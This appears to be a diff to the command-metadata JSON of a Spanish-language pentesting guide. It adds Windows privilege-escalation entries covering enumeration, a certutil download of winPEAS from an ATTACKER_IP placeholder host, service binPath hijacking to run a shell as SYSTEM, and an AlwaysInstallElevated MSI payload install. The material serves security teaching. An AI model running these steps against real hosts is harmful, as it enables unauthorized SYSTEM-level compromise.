@@ -7,7 +7,7 @@
     "totalGuides": 10,
     "totalConcepts": 74,
     "totalPaths": 14,
-    "totalCommandMetadata": 86
+    "totalCommandMetadata": 100
   },
   "tags": [
     "active-directory",
@@ -9986,6 +9986,326 @@
         "No estas en lxd o falta la imagen alpine"
       ],
       "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "systeminfo",
+      "objective": "Sacar OS, parches y arquitectura del host",
+      "tool": "systeminfo",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Version de Windows, hotfixes instalados y arquitectura.",
+      "successSignal": "Un build viejo o pocos hotfixes: candidato a exploit de kernel.",
+      "commonErrors": [
+        "Salida enorme: filtra con findstr /B /C:\"OS\""
+      ],
+      "alternative": "wmic qfe get / winpeas",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "wmic qfe get Caption,Description,HotFixID,InstalledOn",
+      "objective": "Listar parches (KB) instalados",
+      "tool": "wmic",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Los KB aplicados y su fecha.",
+      "successSignal": "Faltan parches recientes: busca CVE de privesc para ese build.",
+      "commonErrors": [
+        "Sistema al dia sin KB explotables"
+      ],
+      "alternative": "Watson / winpeas",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe",
+      "objective": "Descargar un binario con certutil (LOLBAS)",
+      "tool": "certutil",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [
+        "Tu servidor HTTP sirviendo el .exe"
+      ],
+      "expectedOutput": "El fichero cae en C:\\Windows\\Temp.",
+      "successSignal": "certutil confirma la descarga sin AV bloqueando.",
+      "commonErrors": [
+        "AV borra winpeas al tocar disco",
+        "Sin salida a tu IP"
+      ],
+      "alternative": "powershell iwr / IEX in-memory",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "C:\\Windows\\Temp\\winpeas.exe",
+      "objective": "Ejecutar winpeas (enum automatico)",
+      "tool": "winpeas",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Informe con vectores de privesc marcados por color.",
+      "successSignal": "winpeas resalta un servicio/reg/token explotable.",
+      "commonErrors": [
+        "AV lo detecta y lo mata"
+      ],
+      "alternative": "PowerUp.ps1 / seatbelt",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "sc query state= all",
+      "objective": "Enumerar todos los servicios",
+      "tool": "sc",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Nombre y estado de cada servicio.",
+      "successSignal": "Identificas servicios no estandar para revisar permisos/ruta.",
+      "commonErrors": [
+        "Lista muy larga: cruza con accesschk"
+      ],
+      "alternative": "wmic service get",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "sc qc SERVICIO",
+      "objective": "Ver la config de un servicio (ruta y arranque)",
+      "tool": "sc",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "BINARY_PATH_NAME, cuenta y modo de arranque.",
+      "successSignal": "La ruta es escribible o sin comillas: hay vector.",
+      "commonErrors": [
+        "Nombre de servicio incorrecto"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "accesschk.exe -uwcqv \"Authenticated Users\" *",
+      "objective": "Buscar servicios con permisos debiles",
+      "tool": "accesschk",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "Tener accesschk.exe en el host"
+      ],
+      "expectedOutput": "Servicios donde tu grupo tiene SERVICE_CHANGE_CONFIG.",
+      "successSignal": "Un servicio permite reconfigurar binPath: privesc directa.",
+      "commonErrors": [
+        "Ninguno modificable por tu usuario"
+      ],
+      "alternative": "PowerUp Get-ModifiableService",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "sc config SERVICIO binPath= \"cmd /c C:\\Windows\\Temp\\shell.exe\"",
+      "objective": "Secuestrar el binPath de un servicio",
+      "tool": "sc",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Permiso SERVICE_CHANGE_CONFIG sobre el servicio"
+      ],
+      "expectedOutput": "El servicio ejecutara tu binario al reiniciarse.",
+      "successSignal": "Al hacer sc stop/start, tu shell corre como SYSTEM.",
+      "commonErrors": [
+        "El espacio tras binPath= es obligatorio",
+        "No puedes reiniciar el servicio"
+      ],
+      "alternative": "reiniciar el host si el servicio es auto",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\" | findstr /i /v '\"'",
+      "objective": "Cazar servicios con ruta sin comillas",
+      "tool": "wmic",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Servicios cuyo pathname tiene espacios y no esta entre comillas.",
+      "successSignal": "Una ruta tipo C:\\Program Files\\A B\\x.exe sin comillas y con dir escribible.",
+      "commonErrors": [
+        "Todas las rutas van entre comillas (no explotable)"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "icacls \"C:\\Program Files\\Vendor App\"",
+      "objective": "Comprobar si puedes escribir en la ruta del servicio",
+      "tool": "icacls",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "Un servicio con unquoted path apunta ahi"
+      ],
+      "expectedOutput": "Los ACL de esa carpeta.",
+      "successSignal": "Tu usuario tiene (W)/(M): puedes plantar el .exe intermedio.",
+      "commonErrors": [
+        "Sin permiso de escritura: unquoted no explotable aqui"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "schtasks /query /fo LIST /v",
+      "objective": "Enumerar tareas programadas",
+      "tool": "schtasks",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Tareas, su usuario (Run As) y el binario que lanzan.",
+      "successSignal": "Una tarea corre como SYSTEM y su script/exe es escribible.",
+      "commonErrors": [
+        "Todas las tareas apuntan a binarios no escribibles"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "objective": "Revisar programas de autoarranque (HKLM)",
+      "tool": "reg",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Binarios que arrancan con el sistema.",
+      "successSignal": "Un autorun apunta a un .exe en ruta escribible por ti.",
+      "commonErrors": [
+        "Nada escribible en las entradas Run"
+      ],
+      "alternative": "autoruns.exe (Sysinternals)",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+      "objective": "Comprobar AlwaysInstallElevated",
+      "tool": "reg",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "El valor del flag (0x1 = activado).",
+      "successSignal": "Vale 0x1 en HKCU y HKLM: cualquier .msi se instala como SYSTEM.",
+      "commonErrors": [
+        "Solo esta en una rama: hacen falta las dos a 1"
+      ],
+      "alternative": "reg query HKLM\\...\\Installer",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "windows-privesc",
+      "command": "msiexec /quiet /qn /i C:\\Windows\\Temp\\payload.msi",
+      "objective": "Explotar AlwaysInstallElevated con un MSI",
+      "tool": "msiexec",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "AlwaysInstallElevated=1 en HKCU y HKLM"
+      ],
+      "expectedOutput": "El MSI (hecho con msfvenom) se instala como SYSTEM.",
+      "successSignal": "Tu payload corre con privilegios maximos.",
+      "commonErrors": [
+        "El flag no estaba en ambas ramas"
+      ],
+      "alternative": "msfvenom -f msi",
       "checkedVersion": "2025.1",
       "reviewedAt": "2026-07-11"
     }
